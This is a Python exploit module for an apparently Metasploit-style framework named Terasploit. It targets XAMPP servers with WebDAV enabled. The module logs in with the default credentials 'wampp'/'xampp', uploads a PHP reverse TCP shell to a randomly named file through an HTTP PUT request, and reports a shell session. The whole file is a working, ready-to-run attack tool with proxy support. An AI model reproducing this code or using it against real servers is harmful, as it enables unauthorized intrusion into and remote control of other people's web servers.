#######
# Module/Exploit: XAMPP WebDav Upload PHP
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.exploit import *

class TerasploitModule(Exploit):

    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'License'  : 'Terasploit Framework License (BSD)',
                'Name'     : 'XAMPP WebDav Upload PHP',
                'Module'   : Module.exploit,
                'Payload'  : 'modules/payload/php/shell_reverse_tcp',
                "Arch"     : Arch.PHP,
                "Platform" : Platform.PHP,
                'Author'  : [
                    'Charlie <rupture6.dev[at]gmail.com>',
                ],
                'Description' : [
                    'Takes advantage of weak webdav xampp passwords,',
                    'it uses the supplied credentials to exploit the',
                    'target and upload a shell.'
                ],
                'Reference' : [
                    'https://github.com/blu0/webdav-exploit',
                    'metasploit (windows/http/xampp_webdav_upload_php)'
                ]
            }
        )
        
        if info_only:
            return
        
        register_option ('exploit',opt=[
            OptURL.create('rhost',['','yes','the remote host target (url)']),
            OptProxy.create('proxy',['','no','json file containing proxies, json format {"protocol":"proxy",...}']),
            OptBool.create('ssl_verify',['false','no','check ssl certificate on the host']),
            OptString.create('username',['wampp','yes','username to use for authentication']),
            OptString.create('password',['xampp','yes','password to use for authentication']),
            OptString.create('path',['/webdav/','yes','url path to attempt the upload'])
        ])


    def exploit(self) -> tuple[str, bool]:
        payload, _ = Get.payload()
        target, proxy, verify, username, password, path = self.OPT()
        self.ParseURL(target)
        
        shell = self.EncodeShell(payload.generate())
        rand = self.generate_random_name()
        Shell.new(f"{Target.scheme}://{Target.hostname}{path}{rand}.php")
        print (Shell.get(),Target.hostname)
        try:
            exploit = HTTPClient.Request('put',
                url=Shell.get(),
                data=shell,
                auth=HTTPDigestAuth(username,password),
                proxies=self.GetProxy(proxy),
                verify=self.GetBoolean(verify)
            )

            if exploit.status_code in self.good_status_code():
                info_print (f'Shell uploaded: {Shell.get()}', type="GREEN")
                return 'session', True
            else:
                info_print (f'Exploit failed, status code: {exploit.status_code}',type='red')
                return 'session', False
            
        except Exception as error:
            info_print (error,type='red')
            return 'exception', True